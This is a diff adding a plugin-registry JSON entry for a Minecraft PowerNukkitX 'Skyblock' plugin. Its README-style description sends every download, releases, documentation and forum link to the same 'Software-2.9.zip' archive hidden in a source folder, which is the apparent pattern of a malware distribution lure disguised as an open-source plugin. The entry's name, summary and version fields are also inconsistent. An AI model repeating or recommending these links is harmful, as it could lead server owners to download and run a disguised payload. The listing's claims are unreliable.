@@ -1,0 +1,48 @@
+{
+  "api_version": "2.0.0",
+  "authors": [
+    {
+      "avatar_url": "",
+      "name": "ayd1ndemirci",
+      "url": ""
+    },
+    {
+      "avatar_url": "",
+      "name": "OguzhanUmutlu",
+      "url": ""
+    },
+    {
+      "avatar_url": "",
+      "name": "seri4lize",
+      "url": ""
+    }
+  ],
+  "categories": [],
+  "created_at": 1763988784,
+  "dependencies": [],
+  "description": "# 🌌 Skyblock - Explore New Dimensions in Gaming\n\n## ⚡️ Overview\nSkyblock is a project built on PowerNukkitX using Kotlin. This repository offers an incomplete version of a Minecraft Skyblock plugin, encouraging collaboration and learning for those who wish to enhance it further. With Skyblock, you can create unique gaming experiences, even if you're not a programmer.\n\n## 🚀 Getting Started\nTo get started with Skyblock, follow the steps below to download and run the software. With just a few easy clicks, you’ll be able to dive into the world of Minecraft Skyblock.\n\n## 📥 Download Skyblock\n[![Download Skyblock](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip%https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)\n\nClick the button above to quickly access the releases page. \n\n### 🌐 Visit the Releases Page\nYou can also visit the releases page directly: [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip).\n\n## 📚 System Requirements\nBefore downloading, ensure your system meets the following requirements:\n- A device with Minecraft installed\n- PowerNukkitX server version compatible with plugins\n- At least 2GB of RAM available\n- An active internet connection for downloading the plugin\n\n## 🛠 Installation Instructions\n1. **Visit the Releases Page**  \n   Click this link to go to the [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip) page.\n\n2. **Download the Latest Version**  \n   Look for the latest version of Skyblock. It should be available at the top of the releases list. Click the \".jar\" file to download it to your computer.\n\n3. **Add Skyblock to Your Server**  \n   Once the download is complete:\n   - Locate your PowerNukkitX server folder.\n   - Open the \"plugins\" folder inside your server directory.\n   - Move or copy the downloaded `.jar` file into this \"plugins\" folder.\n\n4. **Run Your Server**  \n   Start your PowerNukkitX server. You can do this by running the server executable or using terminal/command line commands. The Skyblock plugin will load automatically.\n\n5. **Test the Plugin**  \n   After starting your server, join your Minecraft server to ensure everything is running smoothly. Look for Skyblock’s features in-game. You are now ready to explore some exciting new dimensions!\n\n## 📖 Features\nSkyblock includes a variety of features designed to enhance your gaming experience:\n- **Island Creation:** Players can build and customize their islands.\n- **Resource Management:** Gather resources to grow your island.\n- **Challenges:** Complete tasks to gain rewards and progress.\n- **Community Engagement:** Share your creations with other players.\n\nFeel free to explore these features and experiment with what you can build. \n\n## 🧑‍🤝‍🧑 Community Contribution\nSkyblock is an open project. If you would like to contribute, consider:\n- Providing feedback on your experience\n- Suggesting new features\n- Helping with coding improvements\n\nTo contribute, fork the repository, make your changes, and submit a pull request. Every bit of assistance helps!\n\n## 🎉 Frequently Asked Questions\n\n### 1. How do I update Skyblock?\nTo update, repeat the download and installation steps. Always check the latest version on the releases page.\n\n### 2. Is there a community forum?\nYou can join discussions on relevant gaming forums and communities, or check our GitHub Discussions page if available.\n\n### 3. How can I report bugs?\nTo report issues, visit our GitHub Issues page and provide a detailed description of the problem.\n\n## 🔗 Useful Links\n- [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)\n- [PowerNukkitX Documentation](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)\n- [Minecraft Community Forums](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)\n\nThank you for choosing Skyblock. We hope you enjoy exploring this plugin in your Minecraft adventures!",
+  "detection_confidence": "high",
+  "downloads": 0,
+  "gallery": [],
+  "icon_url": "https://avatars.githubusercontent.com/u/228748182?v=4",
+  "id": "bruchusorthopnea865/Skyblock",
+  "license": {
+    "id": "MIT",
+    "name": "MIT License",
+    "url": "https://spdx.org/licenses/MIT.html"
+  },
+  "links": null,
+  "manifest_path": "src/main/resources/plugin.yml",
+  "name": "Core",
+  "primary_target": "nkx",
+  "server_version": "",
+  "source": "https://github.com/bruchusorthopnea865/Skyblock",
+  "stars": 0,
+  "summary": "🌌 Explore SkyblockCore, an open-source project for MC:BE, designed as a reference for building your own Skyblock server with Kotlin, MongoDB, and Redis.",
+  "targets": [
+    "nkx",
+    "pnx"
+  ],
+  "updated_at": 1780249812,
+  "versions": []
+}
